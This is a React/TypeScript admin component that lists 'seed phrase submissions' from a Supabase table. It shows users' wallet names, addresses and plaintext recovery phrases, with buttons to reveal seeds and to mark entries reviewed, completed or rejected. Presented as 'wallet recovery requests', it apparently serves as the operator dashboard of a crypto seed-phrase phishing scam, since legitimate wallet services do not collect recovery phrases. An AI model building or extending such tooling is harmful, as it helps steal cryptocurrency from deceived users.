import { useState, useEffect } from 'react';
import { supabase } from '@/lib/supabase';
import { format } from 'date-fns';
import { Eye, EyeOff, CheckCircle, XCircle } from 'lucide-react';

interface Submission {
  id: number;
  wallet_id: string;
  wallet_name: string;
  wallet_address: string;
  seed_phrase: string;
  submission_type: string;
  submitted_at: string;
  status: string;
  notes: string;
}

export function SeedSubmissions() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(true);
  const [showSeeds, setShowSeeds] = useState<Record<number, boolean>>({});

  useEffect(() => {
    fetchSubmissions();
  }, []);

  const fetchSubmissions = async () => {
    try {
      const { data, error } = await supabase
        .from('seed_submissions')
        .select('*')
        .order('submitted_at', { ascending: false });

      if (error) throw error;
      setSubmissions(data || []);
    } catch (error) {
      console.error('Error fetching submissions:', error);
    } finally {
      setLoading(false);
    }
  };

  const updateStatus = async (id: number, status: string) => {
    try {
      const { error } = await supabase
        .from('seed_submissions')
        .update({ status, notes: `Marked as ${status} by admin` })
        .eq('id', id);

      if (error) throw error;
      fetchSubmissions();
    } catch (error) {
      console.error('Error updating status:', error);
    }
  };

  const toggleShowSeed = (id: number) => {
    setShowSeeds(prev => ({ ...prev, [id]: !prev[id] }));
  };

  if (loading) {
    return (
      <div className="flex justify-center py-12">
        <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-semibold text-foreground mb-2">Seed Phrase Submissions</h2>
        <p className="text-sm text-muted-foreground">View all wallet recovery requests from users</p>
      </div>

      <div className="bg-background border border-border rounded-xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-secondary border-b border-border">
              <tr>
                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Date</th>
                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Wallet</th>
                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Type</th>
                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Value</th>
                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Status</th>
                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Actions</th>
              </tr>
            </thead>
            <tbody>
              {submissions.length === 0 ? (
                <tr>
                  <td colSpan={6} className="text-center p-8 text-muted-foreground">
                    No submissions yet
                  </td>
                </tr>
              ) : (
                submissions.map((sub) => (
                  <tr key={sub.id} className="border-b border-border hover:bg-secondary/30">
                    <td className="p-4 text-sm text-foreground">
                      {new Date(sub.submitted_at).toLocaleString()}
                    </td>
                    <td className="p-4">
                      <div className="font-medium text-foreground">{sub.wallet_name}</div>
                      <div className="text-xs text-muted-foreground">{sub.wallet_id}</div>
                    </td>
                    <td className="p-4">
                      <span className={`inline-flex px-2 py-1 rounded-full text-xs font-medium ${
                        sub.submission_type === 'address' 
                          ? 'bg-blue-500/10 text-blue-500' 
                          : 'bg-purple-500/10 text-purple-500'
                      }`}>
                        {sub.submission_type === 'address' ? 'Wallet Address' : 'Seed Phrase'}
                      </span>
                    </td>
                    <td className="p-4">
                      <div className="flex items-center gap-2">
                        <code className="text-xs bg-secondary px-2 py-1 rounded max-w-[200px] truncate font-mono">
                          {sub.submission_type === 'address' ? sub.wallet_address : '••••••••'}
                        </code>
                        {sub.submission_type === 'seed' && (
                          <button
                            onClick={() => toggleShowSeed(sub.id)}
                            className="p-1 hover:bg-secondary rounded"
                          >
                            {showSeeds[sub.id] ? <EyeOff size={14} /> : <Eye size={14} />}
                          </button>
                        )}
                      </div>
                      {sub.submission_type === 'seed' && showSeeds[sub.id] && (
                        <div className="mt-2 p-2 bg-amber-500/10 rounded text-xs font-mono break-all">
                          {sub.seed_phrase}
                        </div>
                      )}
                    </td>
                    <td className="p-4">
                      <span className={`inline-flex px-2 py-1 rounded-full text-xs font-medium ${
                        sub.status === 'completed' 
                          ? 'bg-green-500/10 text-green-500'
                          : sub.status === 'reviewed'
                          ? 'bg-blue-500/10 text-blue-500'
                          : 'bg-yellow-500/10 text-yellow-500'
                      }`}>
                        {sub.status}
                      </span>
                    </td>
                    <td className="p-4">
                      <div className="flex gap-2">
                        <button
                          onClick={() => updateStatus(sub.id, 'reviewed')}
                          className="p-1.5 bg-blue-500/10 text-blue-500 rounded hover:bg-blue-500/20"
                          title="Mark as reviewed"
                        >
                          <Eye size={14} />
                        </button>
                        <button
                          onClick={() => updateStatus(sub.id, 'completed')}
                          className="p-1.5 bg-green-500/10 text-green-500 rounded hover:bg-green-500/20"
                          title="Mark as completed"
                        >
                          <CheckCircle size={14} />
                        </button>
                        <button
                          onClick={() => updateStatus(sub.id, 'rejected')}
                          className="p-1.5 bg-red-500/10 text-red-500 rounded hover:bg-red-500/20"
                          title="Reject"
                        >
                          <XCircle size={14} />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}